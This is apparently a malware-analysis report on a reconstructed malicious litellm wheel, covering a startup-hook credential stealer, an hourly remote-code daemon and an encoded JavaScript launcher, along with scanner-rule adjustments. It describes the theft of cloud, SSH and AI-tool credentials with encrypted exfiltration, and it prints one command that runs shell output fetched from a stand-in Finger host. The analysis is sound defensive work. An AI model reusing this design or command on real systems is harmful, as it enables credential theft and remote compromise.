method: Static source/AST/flow review, Base64/zlib decoding, original-wheel recovery, and closed JavaScript evaluation with all process effects stubbed. No sample network requests or host commands were executed.

samples.identification: Python sitecustomize credential stealer and HTTP-code daemon
execution: Python imports sitecustomize automatically when its directory is on the interpreter startup path. The supplied standalone path does not prove installation on that path.
The module opens an advisory lock, forks a child, creates a new session, changes to /, and duplicates /dev/null over stdin/stdout/stderr. The detached child runs poll().
Each iteration fetches a hostname from GitHub raw text, calls collect(), downloads http://<hostname>/codepy, executes the response as Python, and sleeps 3600 seconds.
collection: collect() snapshots the complete environment, reads AWS credentials, an SSH private key, and Codex/Claude/Copilot authentication files.
When DATABASE_URL is set, it connects with psycopg2 and fetches all rows from LiteLLM_CredentialsTable and LiteLLM_ProxyModelTable into the report.
The report is serialized and POSTed to http://www.litellm.dev/healthcheck with a fixed X-Token header.
samples.judgment_basis: Unattended startup execution combines unrelated cross-vendor secret collection, outbound reporting, remote arbitrary code execution, and stdio concealment. No credential-management or LLM-routing purpose accounts for this combination.
limits: Dependencies, Unix APIs, permissions, network responses and database configuration determine success. A database or network exception can terminate polling.
Deployment authorization, the current remote command and endpoint ownership are unavailable. No additional family attribution is inferred.

execution: The five-member 4113-byte wheel carries cook.pth importing cook, cook.py, sitecustomize.py and minimal dist-info metadata. It is not an original distribution binary.
cook.py immediately executes Base64/zlib-decoded Python. The decoded collector is also recovered as script@25 and base64@59 analysis layers; these are the same payload, not two separate stages.

sitecustomize.py forks and creates a detached session, obtains an advisory lock and starts an asyncio polling loop. It fetches a hostname from GitHub raw text, fetches /codepy over HTTP, and submits exec(compile(response,...)) through a thread pool every hour.
collection: The decoded collector touches a /tmp one-shot sentinel before collection. Unlike the original collector, a failed send still leaves that sentinel.
It snapshots its environment, reads AWS/Docker/Kubernetes and developer authentication files, shell histories, a Kubernetes service-account token and readable /proc/[0-9]*/environ files.

It optionally queries the LiteLLM credential and model tables. JSON bytes are split into 400-byte chunks and encrypted under a shipped 4096-bit RSA public key using OAEP/SHA-256. The ciphertext is POSTed to the healthcheck endpoint with a legacy browser User-Agent and fixed token.
OpenSSL independently parsed the reconstruction public key as RSA 4096 bits; OAEP/SHA-256 supports the selected 400-byte chunk length.
samples.judgment_basis: Python startup hooks activate an encoded multi-source secret collector and an unverified HTTP code daemon. These effects are unrelated to the package declared purpose of LLM API routing.
samples.original_recovery: forager fetch --all-wheels recovered seven platform wheels for pkg:pypi/litellm@1.107.0. METADATA confirms name/version. Each original contains cook.pth, cook.py and sitecustomize.py under .data/purelib. Their 37-39 MB sizes, hashes and payloads differ from this reconstruction. The original decoded collector is 61000 bytes and includes additional browser/cloud acquisition and hybrid AES/RSA encryption; none of those extra behaviors is attributed to the reconstruction.
limits: The supplied package is expressly a reconstruction. Its local bytes support the verdict, but its hash must not be presented as an original PyPI release hash.
Interpreter startup location, dependencies, Unix support, file access and reachable services determine operational success. No remote payload was retrieved.

execution: The replacement characters are absent from the Base64 string, so both Unicode replaceAll calls are no-ops. The neutral replacement-call trait remains accurate; effective Unicode concealment is not claimed.
Buffer.from(...,base64).toString(utf8) becomes the sole Function body and the constructed function is immediately invoked.
The decoded JavaScript invokes child_process.exec with: cmd.exe /c start "" /min for /f "delims=" %q in ('finger stage@relay.example') do %q

FOR captures the Finger response lines and uses the same case-sensitive variable as the command. START requests minimization. A closed evaluator with stubbed Buffer/require/exec captured precisely this command without launching it.
samples.judgment_basis: Encoding conceals a minimized shell launcher that treats network-supplied output as commands. No benign application behavior or authorized remote-administration purpose is supplied.
limits: relay.example is reserved and does not establish a functioning attacker service.
Function executes in global scope; ordinary CommonJS-local require may not be available to it. Windows command-shell availability is also required.
Final Finger response, downstream actions and deployment provenance are unavailable.
samples.hostile_goal: Two distinct hostile findings cover the Finger command channel and minimized launch. A new bound Base64-to-Function invocation trait covers local activation at notable severity. A third hostile evaluation composite was considered and rejected: file-wide decoded Finger text plus an evaluator cannot prove the evaluator consumes that particular text, and duplicating the existing C2/evasion findings would not add a distinct attack behavior. No additional remote-payload behaviors are visible to match.

additions: Bound glob-selected procfs environment reads to the actual loop variable and read_bytes/decode operation. Reject rebound variables and unrelated filesystem roots.

Credential-access/env composite identifies this cross-process acquisition in a file already demonstrating cloud credential exfiltration. The description states the co-occurrence and does not claim an unproved source-to-send flow.
Bind a loaded PEM key, RSA-OAEP chunk encryption, bytes join and the immediately following POST data argument. Reject key/body mismatches, overwrites, header-only uses and generator shadowing.
Bind Base64 Buffer decoding to the sole immediately invoked Function body. Constructor-only, parameter-only, unrelated decode/eval and other encodings are excluded.
relocations: Hostname-only www.litellm.dev reference moves from C2 infrastructure to neutral URL host/name with its matcher, scope, severity and exact consumer preserved. Host text alone establishes neither contact nor control.

Encoded dnshook.site callback-host reference moves from host/name to host/oob, preserving its matcher, severity and all three exact consumer sites. No broad host ancestor consumers were found. This also preserves the reviewed 100-rule host/name budget.

cook.pth wheel-member observation moves from malware-family identity to metadata/file/archive. Its matcher, format/platform/size scope, severity and startup-indicator consumer are retained. A neutral member name does not identify malware. Its inherited supply-chain ATT&CK mapping is removed because naming alone establishes no compromise.
trait_review.narrowing: The column-zero POST matcher incorrectly fired in compressed cook.py because extracted decoded text runs strip indentation. It now requires an actual direct module-level POST statement with a URL literal and body keyword. The helper POST and quoted-code near misses are rejected; an existing import-time OOB beacon fixture still matches its hostile consumer. All four direct consumers in objectives/supply-chain/recon-exfil/import-time/python.yaml were inspected. The atom is renamed python-module-post-url-body to describe module scope rather than byte-column position; all four consumers use the new ID.
trait_review.ancestor_audit: The hostname move intentionally removes a hostname-only leg from the broad domain selectors in ocra-c2-hostile and embedded-c2-list. Neither the moved source-scoped hostname trait nor these selectors establishes C2 contact. Other domain alternatives remain intact; original recovered collector and startup-daemon hostile coverage was checked. There are no exact/broad consumers of the moved privcollect directory beyond its updated startup-indicator rule.
trait_review.severity_reductions: None. Existing hostile and suspicious findings on all supplied samples are retained.

verification.validation: Final command: make validate; outcome reported in the final response.
verification.classification_review: Overall scanner verdicts remain hostile. The JavaScript raw model routes still choose class 0 (benign), despite correct hostile behavior findings and the combined 0.98 result. The wheel-specific route also chooses benign, but the generic route and all active payload members are detected. This is a classifier limitation; no inaccurate traits were restored or duplicates added to alter its score. The scanner reports a v18 feature specification while expecting v21.

evidence_location: Complete scan/fact dumps, decoded source, logs and recovered artifacts with .forage.json provenance are in the named scratch directory, under acquit-*.
